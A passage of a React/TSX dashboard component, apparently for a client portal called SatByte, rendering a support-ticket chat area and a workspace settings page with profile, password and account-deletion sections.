              {/* TAB: SUPPORT */}
              {activeTab === 'support' && (
                <div className="space-y-8 pb-20">
                  <div>
                    <h2 className="text-3xl font-black text-white tracking-tighter mb-2">Support Center</h2>
                    <p className="text-muted-foreground">Get technical assistance or report an issue.</p>
                  </div>

                  <div className="h-[75vh] min-h-[600px] bg-[#0A0F14] border border-white/5 rounded-[3rem] overflow-hidden shadow-2xl flex flex-col md:flex-row">
                    {/* Sidebar: Tickets */}
                    <aside className={`md:w-80 border-r border-white/5 flex flex-col ${(selectedTicketId || isCreatingNewTicket) ? 'hidden md:flex' : 'flex w-full'}`}>
                      <div className="p-8 border-b border-white/5 bg-white/[0.01]">
                        <button 
                          onClick={() => { setSelectedTicketId(null); setIsCreatingNewTicket(true); }}
                          className="w-full py-4 rounded-2xl bg-primary text-white font-bold shadow-lg shadow-primary/20 hover:opacity-90 transition-all flex items-center justify-center gap-2"
                        >
                          + New Ticket
                        </button>
                      </div>
                      
                      <div className="flex-1 overflow-y-auto hide-scrollbar p-4 space-y-3">
                        {ticketsItems?.map((ticket: any) => (
                          <button 
                            key={ticket._id}
                            onClick={() => { setSelectedTicketId(ticket._id); setIsCreatingNewTicket(false); }}
                            className={`w-full text-left p-5 rounded-[1.5rem] border transition-all ${
                              selectedTicketId === ticket._id 
                                ? 'bg-primary/10 border-primary/30' 
                                : 'bg-transparent border-transparent hover:bg-white/5'
                            }`}
                          >
                            <div className="flex justify-between items-start mb-2">
                              <h4 className="font-bold text-white truncate pr-4 text-[15px]">{ticket.subject}</h4>
                              <span className={`h-2 w-2 rounded-full mt-1.5 ${ticket.status === 'Open' ? 'bg-green-400' : ticket.status === 'Closed' ? 'bg-slate-600' : 'bg-yellow-400 animate-pulse'}`} />
                            </div>
                            <p className="text-xs text-muted-foreground truncate mb-3">{ticket.messages?.at(-1)?.content || 'Ticket opened...'}</p>
                            <div className="flex items-center text-[10px] text-muted-foreground/60 font-bold uppercase tracking-widest">
                              <Clock className="h-3 w-3 mr-1.5" />
                              {new Date(ticket.updatedAt).toLocaleDateString()}
                            </div>
                          </button>
                        ))}
                      </div>
                    </aside>

                    {/* Chat Area */}
                    <div className="flex-1 flex flex-col bg-black/20">
                      {selectedTicket ? (
                        <>
                          <div className="p-6 md:p-8 border-b border-white/5 flex items-center justify-between bg-white/[0.01]">
                             <div className="flex items-center gap-4">
                               <button className="md:hidden text-muted-foreground" onClick={() => setSelectedTicketId(null)}><ChevronRight className="h-5 w-5 rotate-180" /></button>
                               <div>
                                 <h3 className="text-xl font-bold text-white leading-tight">{selectedTicket.subject}</h3>
                                 <p className="text-[10px] font-bold text-muted-foreground uppercase tracking-widest mt-1">Ticket: {selectedTicket._id.slice(-8).toUpperCase()}</p>
                               </div>
                             </div>
                             <div className="flex items-center gap-4">
                               <Badge className={`${selectedTicket.status === 'Open' ? 'bg-green-500/20 text-green-400' : 'bg-slate-800 text-muted-foreground'} border-none uppercase tracking-widest text-[10px]`}>{selectedTicket.status}</Badge>
                               {selectedTicket.status !== 'Closed' && <button onClick={handleCloseTicket} className="text-xs font-bold text-red-400 hover:underline">Resolve</button>}
                             </div>
                          </div>

                          <div className="flex-1 overflow-y-auto p-8 space-y-8 hide-scrollbar">
                            {selectedTicket.messages.map((msg: any, idx: number) => (
                              <div key={idx} className={`flex flex-col ${msg.sender === 'client' ? 'items-end' : 'items-start'}`}>
                                <div className={`max-w-[85%] rounded-[2rem] px-6 py-4 shadow-xl ${msg.sender === 'client' ? 'bg-primary text-white rounded-tr-sm' : 'bg-[#151B23] text-white border border-white/5 rounded-tl-sm'}`}>
                                  <p className="text-sm leading-relaxed whitespace-pre-wrap">{msg.content}</p>
                                </div>
                                <span className="text-[10px] font-bold text-muted-foreground mt-2 uppercase tracking-widest px-1">
                                  {msg.sender === 'client' ? 'You' : 'SatByte Agent'} • {new Date(msg.createdAt).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}
                                </span>
                              </div>
                            ))}
                          </div>

                          {selectedTicket.status !== 'Closed' && (
                            <div className="p-6 bg-white/[0.02] border-t border-white/5">
                               <form onSubmit={handleReplyTicket} className="relative flex items-end gap-2">
                                 <textarea 
                                   placeholder="Type your response..." 
                                   value={replyMessage}
                                   onChange={(e) => setReplyMessage(e.target.value)}
                                   className="w-full bg-[#020609] border border-white/10 text-white rounded-[1.5rem] px-6 py-4 min-h-[60px] max-h-[200px] focus:border-primary/50 focus:outline-none resize-none transition-all placeholder-muted-foreground"
                                   onKeyDown={(e) => { if(e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); handleReplyTicket(e); }}}
                                 />
                                 <button type="submit" disabled={!replyMessage.trim()} className="absolute right-3 bottom-3 h-11 w-11 rounded-2xl bg-primary text-white flex items-center justify-center shadow-lg shadow-primary/20 hover:scale-105 active:scale-95 transition-all">
                                   <Send className="h-5 w-5" />
                                 </button>
                               </form>
                            </div>
                          )}
                        </>
                      ) : isCreatingNewTicket ? (
                        <div className="flex-1 flex items-center justify-center p-8">
                           <div className="w-full max-w-lg space-y-10">
                              <div className="text-center">
                                <h3 className="text-3xl font-bold text-white mb-2">New Support Ticket</h3>
                                <p className="text-muted-foreground">Describe your inquiry and we'll be in touch.</p>
                              </div>
                              <form onSubmit={handleCreateTicket} className="space-y-6">
                                <div className="space-y-3">
                                  <label className="text-[11px] font-bold uppercase tracking-[0.2em] text-muted-foreground px-1">Topic</label>
                                  <select className="w-full bg-[#020609] border border-white/10 rounded-2xl px-6 py-4 text-white focus:border-primary/50 focus:outline-none appearance-none" value={activeTicketParams.orderId} onChange={(e) => setActiveTicketParams(p => ({...p, orderId: e.target.value}))}>
                                    <option value="">General Support</option>
                                    {data?.map(o => <option key={o._id} value={o._id}>{o.planName}</option>)}
                                  </select>
                                </div>
                                <div className="space-y-3">
                                  <label className="text-[11px] font-bold uppercase tracking-[0.2em] text-muted-foreground px-1">Subject</label>
                                  <input className="w-full bg-[#020609] border border-white/10 rounded-2xl px-6 py-4 text-white focus:border-primary/50 focus:outline-none" placeholder="Brief summary of the issue" value={activeTicketParams.subject} onChange={(e) => setActiveTicketParams(p => ({...p, subject: e.target.value}))} required />
                                </div>
                                <div className="space-y-3">
                                  <label className="text-[11px] font-bold uppercase tracking-[0.2em] text-muted-foreground px-1">Message</label>
                                  <textarea className="w-full bg-[#020609] border border-white/10 rounded-2xl px-6 py-4 text-white focus:border-primary/50 focus:outline-none min-h-[150px] resize-none" placeholder="Explain the problem in detail..." value={activeTicketParams.message} onChange={(e) => setActiveTicketParams(p => ({...p, message: e.target.value}))} required />
                                </div>
                                <Button type="submit" className="w-full h-14 rounded-2xl bg-primary text-white font-black text-lg shadow-xl shadow-primary/20">Submit Ticket</Button>
                                <button type="button" onClick={() => setIsCreatingNewTicket(false)} className="w-full text-sm font-bold text-muted-foreground hover:text-white transition-colors">Cancel</button>
                              </form>
                           </div>
                        </div>
                      ) : (
                        <div className="flex-1 flex flex-col items-center justify-center text-center p-12 opacity-50">
                           <MessageSquare className="h-20 w-20 text-muted-foreground mb-6" />
                           <h3 className="text-2xl font-bold text-white mb-2">Select a Conversation</h3>
                           <p className="text-muted-foreground max-w-xs">Pick an existing ticket from the sidebar or start a new support request.</p>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {/* TAB: SETTINGS */}
              {activeTab === 'settings' && (
                <div className="space-y-12 pb-20">
                   <div>
                    <h2 className="text-3xl font-black text-white tracking-tighter mb-2">Workspace Settings</h2>
                    <p className="text-muted-foreground">Manage your personal profile and security preferences.</p>
                  </div>

                  <div className="grid lg:grid-cols-3 gap-10">
                    <div className="lg:col-span-2 space-y-10">
                       {/* Profile Form */}
                       <div className="p-10 rounded-[3rem] bg-[#0A0F14] border border-white/5 shadow-2xl relative overflow-hidden">
                          <div className="flex items-center justify-between mb-10">
                             <h3 className="text-2xl font-bold text-white">Profile Information</h3>
                             <button 
                               onClick={() => isEditingProfile ? handleUpdateProfile() : setIsEditingProfile(true)} 
                               disabled={profileLoading}
                               className={`h-11 px-6 rounded-xl font-bold text-sm transition-all flex items-center gap-2 ${isEditingProfile ? 'bg-green-600 text-white hover:bg-green-500' : 'bg-white/5 text-white hover:bg-white/10'}`}
                             >
                               {profileLoading ? (
                                 <span className="h-4 w-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                               ) : isEditingProfile ? 'Save Changes' : 'Edit Profile'}
                             </button>
                          </div>
                          
                          <div className="grid md:grid-cols-2 gap-8">
                             {[
                               { label: 'Full Name', key: 'name', placeholder: 'Your name' },
                               { label: 'Phone Number', key: 'phone', placeholder: '+91 ...' },
                               { label: 'Company', key: 'company', placeholder: 'Organization', span: true },
                             ].map((field) => (
                               <div key={field.key} className={`space-y-3 ${field.span ? 'md:col-span-2' : ''}`}>
                                  <label className="text-[11px] font-bold uppercase tracking-[0.2em] text-muted-foreground px-1">{field.label}</label>
                                  {isEditingProfile ? (
                                    <input className="w-full bg-[#020609] border border-white/10 rounded-2xl px-6 py-4 text-white focus:border-primary/50 focus:outline-none" value={(profileForm as any)[field.key]} onChange={(e) => setProfileForm(p => ({...p, [field.key]: e.target.value}))} />
                                  ) : (
                                    <div className="px-6 py-4 bg-white/[0.02] border border-white/5 rounded-2xl text-white font-medium min-h-[60px] flex items-center">{(profileForm as any)[field.key] || '—'}</div>
                                  )}
                               </div>
                             ))}
                          </div>
                       </div>

                       {/* Security Section */}
                       <div className="p-10 rounded-[3rem] bg-[#0A0F14] border border-white/5 shadow-2xl">
                          <h3 className="text-2xl font-bold text-white mb-8">Account Security</h3>
                          <form onSubmit={handleUpdatePassword} className="space-y-6">
                             <div className="space-y-3">
                               <label className="text-[11px] font-bold uppercase tracking-[0.2em] text-muted-foreground px-1">Update Password</label>
                               <div className="flex gap-4">
                                 <input type="password" className="flex-1 bg-[#020609] border border-white/10 rounded-2xl px-6 py-4 text-white focus:border-primary/50 focus:outline-none" placeholder="Minimum 8 characters" value={newPassword} onChange={(e) => setNewPassword(e.target.value)} required />
                                 <Button type="submit" disabled={passLoading} className="h-14 px-8 bg-primary text-white font-bold rounded-2xl shadow-xl shadow-primary/20">Update</Button>
                               </div>
                               {passMsg && <p className={`text-xs font-bold mt-2 ${passMsg.type === 'success' ? 'text-green-400' : 'text-red-400'}`}>{passMsg.text}</p>}
                             </div>
                          </form>
                       </div>
                    </div>

                    <div className="space-y-8">
                       <div className="p-10 rounded-[3rem] bg-gradient-to-br from-[#0A0F14] to-transparent border border-white/5 shadow-xl">
                          <h4 className="text-lg font-bold text-white mb-4">Workspace Insights</h4>
                          <div className="space-y-6">
                             {[
                               { label: 'Active Projects', val: data?.length || 0, icon: FolderGit2 },
                               { label: 'Total Invoices', val: data?.length || 0, icon: CreditCard },
                               { label: 'Support Tickets', val: ticketsItems?.length || 0, icon: MessageSquare },
                             ].map((stat, i) => (
                               <div key={i} className="flex items-center justify-between">
                                 <div className="flex items-center gap-3 text-muted-foreground">
                                   <stat.icon className="h-4 w-4" />
                                   <span className="text-sm font-semibold">{stat.label}</span>
                                 </div>
                                 <span className="text-xl font-black text-white">{stat.val}</span>
                               </div>
                             ))}
                          </div>
                       </div>
                       
                       <div className="p-10 rounded-[3rem] bg-red-500/5 border border-red-500/10 shadow-xl">
                          <h4 className="text-lg font-bold text-red-400 mb-2">Danger Zone</h4>
                          <p className="text-xs text-muted-foreground leading-relaxed mb-6">Irreversible actions that affect your entire workspace access and associated data.</p>
                          <Button variant="outline" className="w-full h-12 border-red-500/20 text-red-400 font-bold hover:bg-red-500/10 rounded-xl">Delete Account</Button>
                       </div>
                    </div>
                  </div>
                </div>
              )}

            </motion.div>
          )}
        </AnimatePresence>
      </div>
      </main>
      <OrderDetailsModal 
        isOpen={isDetailsModalOpen} 
        onClose={() => setIsDetailsModalOpen(false)} 
        order={selectedOrderDetails} 
      />
    </div>
  )
}
